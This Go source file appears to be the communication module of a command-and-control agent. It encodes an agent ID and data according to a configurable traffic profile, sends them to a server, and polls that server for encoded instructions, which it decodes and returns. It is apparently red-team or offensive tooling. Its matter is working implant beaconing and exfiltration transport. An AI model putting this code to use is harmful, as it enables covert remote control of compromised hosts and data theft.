package main

import (
	"io"

	profiles "github.com/zarkones/ControlPROFILE"
)

func send(agentId *string, profile *profiles.Profile, data *string) (err error) {
	reqBody, err := profiles.OperateData(&profile.Respond.Payload.Request.Operations, data, true)
	if err != nil {
		return err
	}
	processedAgentId, err := profiles.OperateData(&profile.Respond.ID.Operations, agentId, true)
	if err != nil {
		return err
	}

	client := profile.GetHttpClient()

	req, err := profile.GetRequestSend(&processedAgentId, []byte(reqBody))
	if err != nil {
		return err
	}

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer func() {
		if resp.Body != nil {
			resp.Body.Close()
		}
	}()

	return nil
}

func receive(agentId *string, profile *profiles.Profile) (instruction string, err error) {
	processedAgentId, err := profiles.OperateData(&profile.Receive.ID.Operations, agentId, true)
	if err != nil {
		return "", err
	}

	client := profile.GetHttpClient()

	req, err := profile.GetRequestReceive(&processedAgentId, nil)
	if err != nil {
		return "", err
	}

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer func() {
		if resp.Body != nil {
			resp.Body.Close()
		}
	}()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	if len(body) == 0 {
		return "", nil
	}

	bodyStr := string(body)

	return profiles.OperateDataReverseOperations(&profile.Receive.Payload.Response.Operations, &bodyStr, false)
}
